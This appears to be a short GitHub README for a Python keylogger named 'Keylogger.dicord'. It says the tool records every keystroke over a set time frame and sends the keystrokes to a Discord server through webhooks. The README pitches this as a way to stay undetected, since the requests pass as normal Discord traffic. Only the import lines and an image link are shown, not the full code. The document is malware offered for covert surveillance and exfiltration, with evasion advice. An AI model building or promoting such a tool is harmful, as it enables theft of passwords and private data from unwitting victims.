# Keylogger.dicord
This python script will capture all of the keystrokes within a given time frame and report them to a Discord Server using Webhooks. Instead of the traditional "save to file" or "report to email" methods, you can use this method to stay undetected since webhook requests are considered as normal Discord Traffic.

import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed


![image](https://user-images.githubusercontent.com/86205212/209600894-127820e3-c724-49db-8404-0ad838bd1262.png)
